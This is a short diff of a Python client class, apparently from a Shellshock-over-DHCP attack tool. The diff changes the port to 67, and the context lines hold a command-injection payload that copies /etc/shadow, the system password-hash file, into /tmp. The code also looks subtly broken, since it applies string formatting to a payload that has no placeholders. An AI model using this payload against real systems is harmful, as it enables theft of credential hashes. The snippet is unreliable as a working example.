@@ -18,7 +18,7 @@ class Client:
     def __init__(self):
         self.ip = b'192.168.110.23'
         print(self.ip)
-        self.port = 8008
+        self.port = 67
 
         self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow" % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
